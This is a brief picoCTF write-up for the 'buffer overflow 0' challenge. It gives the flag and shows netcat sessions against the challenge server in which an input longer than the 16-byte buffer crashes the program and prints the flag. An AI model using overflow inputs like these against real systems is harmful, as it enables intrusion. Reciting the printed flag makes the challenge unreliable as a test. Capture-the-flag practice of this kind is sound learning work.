# Challenge 1: buffer overflow 0
Challenge is asking to exploit the code by overflowing the buffer in the given C source file.

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## My Approach:
First I started with entering a normal input, on entering the program gets ended. Them I checked the C source code provided to us, there I saw that buffer char array's maximum size is 16. Therefore, to overflow, input should be of greater size than the size of the array.

```
krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 123
The program will exit now

krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 0000000000000000
The program will exit now

krishna@ULTRON:~$
krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 0000000000000000000000000000000000000000
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## My Learnings:
Got to know about stack overflows.
